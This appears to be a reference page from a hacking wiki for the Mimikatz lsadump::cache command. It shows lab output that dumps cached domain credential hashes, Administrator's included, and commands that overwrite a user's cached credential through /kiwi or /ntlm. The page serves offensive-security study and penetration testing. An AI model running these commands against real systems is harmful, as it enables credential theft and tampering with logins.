# cache

`lsadump::cache` can be used to enumerate Domain Cached Credentials from registry. It does so by acquiring the `SysKey` to decrypt `NL$KM` (binary protected value) and then `MSCache(v1/v2)`.

The registry key for the Domain Cached Credentials is `HKEY_LOCAL_MACHINE\SECURITY\Cache`

The number of cached entries is defined in `CachedLogonCount` in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

It has the following command line arguments:

* `/sam`: the SAM hive
* `/system`: The SYSTEM hive
* `/security`: The SECURITY hive
* `/user`: An existing username to modify the cached credentials
* `/password`: The new password of the specified user
* `/dcc`: The MS-Cache hash to be replaced
* `/ntlm`: The NTLM hash which will calculate the MS-Cache
* `/kiwi`: [Undocumented parameter](https://security.stackexchange.com/questions/182986/replacing-cached-domain-credentials-in-security-hive/185531#185531) which modifies the user's cached password to **mimikatz**
* `/subject`: The subject's certificate name. This name must conform to the X.500 standard. The simplest method is to specify the name in double quotes, preceded by `CN=` (e.g. `CN=myName`) ([more info](https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-2.0/bfsktky3\(v=vs.80\)?redirectedfrom=MSDN)).

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

{% hint style="warning" %}
This command requires elevated privileges (by previously running [privilege::debug](https://tools.thehacker.recipes/mimikatz/modules/privilege/debug) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # lsadump::cache
Domain : WIN10
SysKey : 7e6804db6db0bbc15372ddf840962151

Local name : WIN10 ( S-1-5-21-1604892360-3618202543-1602915806 )
Domain name : hacklab ( S-1-5-21-2725560159-1428537199-2260736313 )
Domain FQDN : hacklab.local

Policy subsystem is : 1.18
LSA Key(s) : 1, default {9b57ea93-9de6-5d50-0497-034513ddc692}
  [00] {9b57ea93-9de6-5d50-0497-034513ddc692} 62dd3714cc6d8e08f2c90bb18d949eb4e7fddb2478342640c5dc78a68d165e05

* Iteration is set to default (10240)

[NL$1 - 10/30/2021 8:53:10 PM]
RID       : 000006c2 (1730)
User      : hacklab\m3g9tr0n
MsCacheV2 : 7d3fb233bff87d75413d2c813df73fec

[NL$2 - 9/26/2021 2:46:02 PM]
RID       : 000001f4 (500)
User      : hacklab\Administrator
MsCacheV2 : fadb59e7f2f9a9bf6557ad4fa09e828f

[NL$3 - 10/18/2021 3:56:38 PM]
RID       : 000006c4 (1732)
User      : hacklab\optimus
MsCacheV2 : 98982877b0b57416d47a9a8f21331536
```

### Modify a DCC with `/kiwi`

```
mimikatz # lsadump::cache /user:hacklab\optimus /kiwi
> User cache replace mode !
  * user     : hacklab\optimus
  * password : mimikatz <-------------------- Default Password
  * ntlm     : 60ba4fcadc466c7a033c178194c03df6

Domain : WIN10
SysKey : 7e6804db6db0bbc15372ddf840962151

Local name : WIN10 ( S-1-5-21-1604892360-3618202543-1602915806 )
Domain name : hacklab ( S-1-5-21-2725560159-1428537199-2260736313 )
Domain FQDN : hacklab.local

...Output Omitted...
```

{% hint style="warning" %}
When changing the cached password for a user, all the related DPAPI data will be affected.
{% endhint %}

### Modify a DCC with `/ntlm`

```
mimikatz # lsadump::cache /user:hacklab\optimus /ntlm:647d6f9b59c899c5fe4dad779522b8c5
> User cache replace mode !
  * user     : hacklab\optimus
  * ntlm     : 647d6f9b59c899c5fe4dad779522b8c5

Domain : WIN10
SysKey : 7e6804db6db0bbc15372ddf840962151
```
